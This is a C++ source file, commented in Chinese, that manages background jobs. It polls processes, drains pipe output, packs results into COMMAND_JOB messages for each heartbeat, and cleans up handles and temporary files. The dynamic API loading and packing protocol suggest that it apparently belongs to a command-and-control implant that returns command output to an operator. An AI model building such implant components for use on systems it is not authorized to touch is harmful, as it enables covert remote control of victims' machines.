// 文件作用：后台 job 管理实现：检查异步任务状态，并把完成结果打包回传。
#include "JobsController.h"
#include "ApiLoader.h"

// JobsController::operator new 使用本项目的内存分配函数创建 job 管理器。
void* JobsController::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

// JobsController::operator delete 释放 job 管理器占用的本地内存。
void JobsController::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(JobsController));
}

// CreateJobData 创建后台任务记录，保存进程句柄、PID、输入输出管道和状态。
JobData JobsController::CreateJobData(ULONG taskId, WORD Type, WORD State, HANDLE object, WORD pid, HANDLE input, HANDLE output, CHAR* outputPath)
{
    JobData jobData = { taskId, Type, State, object, pid, input, output, outputPath };
	this->jobs.push_back(jobData);
	return jobData;
}

// ProcessJobs 检查后台任务是否结束，并读取输出打包回传。
void JobsController::ProcessJobs(Packer* packer)
{
	if ( !this->jobs.size() )
		return;

	for (int i = 0; i < this->jobs.size(); i++) {

        ULONG  available = 0;
		BOOL regularFile = this->jobs[i].outputPath != NULL;
		LPVOID buffer    = ReadDataFromAnonPipe(this->jobs[i].pipeRead, &available, regularFile);
		if (regularFile && available > 0)
			buffer = NormalizeProcessOutput((BYTE*)buffer, &available);
        if (available > 0) {
			packer->Pack32(jobs[i].jobId);
			packer->Pack32(COMMAND_JOB);
			packer->Pack8(jobs[i].jobType);
			packer->Pack8(JOB_STATE_RUNNING);
			packer->PackBytes((BYTE*)buffer, available);
			
			MemFreeLocal(&buffer, available);
        }

		if (jobs[i].jobState == JOB_STATE_RUNNING) {

			// Keep a job alive when querying its exit code fails. Treating the
			// untouched zero value as an exit status deletes file-backed output
			// before the child has flushed it.
			ULONG status = STILL_ACTIVE;
			BOOL processExited = FALSE;
			if (jobs[i].jobType == JOB_TYPE_PROCESS) {
				processExited = ApiWin->GetExitCodeProcess(jobs[i].jobObject, &status);
			}

			if (processExited && status != STILL_ACTIVE) {
				jobs[i].jobState = JOB_STATE_FINISHED;
			}
		}

		// A file-backed fallback can still be empty during the first poll even
		// though the child exits before the next heartbeat. Drain once more after
		// observing process exit so data flushed by the child is not deleted with
		// the temporary output file.
		if ((jobs[i].jobState == JOB_STATE_KILLED || jobs[i].jobState == JOB_STATE_FINISHED) &&
			jobs[i].pipeRead) {
			ULONG finalAvailable = 0;
			LPVOID finalBuffer = ReadDataFromAnonPipe(jobs[i].pipeRead, &finalAvailable, regularFile);
			if (regularFile && finalAvailable > 0)
				finalBuffer = NormalizeProcessOutput((BYTE*)finalBuffer, &finalAvailable);
			if (finalAvailable > 0) {
				packer->Pack32(jobs[i].jobId);
				packer->Pack32(COMMAND_JOB);
				packer->Pack8(jobs[i].jobType);
				packer->Pack8(JOB_STATE_RUNNING);
				packer->PackBytes((BYTE*)finalBuffer, finalAvailable);
				MemFreeLocal(&finalBuffer, finalAvailable);
			}
		}

		if (jobs[i].jobState == JOB_STATE_KILLED || jobs[i].jobState == JOB_STATE_FINISHED) {

			if (jobs[i].jobType == JOB_TYPE_PROCESS && jobs[i].jobState == JOB_STATE_KILLED) {
				ApiNt->NtTerminateProcess(jobs[i].jobObject, NULL);
			}

			if (jobs[i].pipeRead) {
				ApiNt->NtClose(jobs[i].pipeRead);
				jobs[i].pipeRead = NULL;
			}
			if (jobs[i].pipeWrite) {
				ApiNt->NtClose(jobs[i].pipeWrite);
				jobs[i].pipeWrite = NULL;
			}
			if (jobs[i].jobObject) {
				ApiNt->NtClose(jobs[i].jobObject);
				jobs[i].jobObject = NULL;
			}
			if (jobs[i].outputPath) {
				ApiWin->DeleteFileA(jobs[i].outputPath);
				MemFreeLocal((LPVOID*)&jobs[i].outputPath, MAX_PATH);
			}

			packer->Pack32(jobs[i].jobId);
			packer->Pack32(COMMAND_JOB);
			packer->Pack8(jobs[i].jobType);
			packer->Pack8(jobs[i].jobState);

			jobs.remove(i);
			--i;
		}
	}
}
